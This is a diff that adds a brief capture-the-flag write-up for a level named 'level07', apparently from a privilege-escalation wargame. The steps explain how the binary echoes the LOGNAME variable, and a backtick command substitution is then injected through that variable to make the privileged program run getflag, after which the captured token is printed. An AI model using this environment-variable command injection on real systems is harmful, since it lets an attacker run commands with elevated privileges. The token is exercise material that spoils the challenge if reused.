@@ -1,0 +1,10 @@
+1. we run the binary in this level07
+	./level07 we got level07 printed out
+2. this result can be many things, the name of the program of user or another things
+3. run env , we see there is USER and LOGNAME both have level07 as result
+4. we run strings level07, we found out LOGNAME is used
+5. so this one we just need to change env
+6. we make a try  export LOGNAME=hey
+	./level07 prints hey, great
+7. export LOGNAME=\`getflag\` 
+8. we run ./level07 got the token fiumuikeil55xe9cu4dood66h
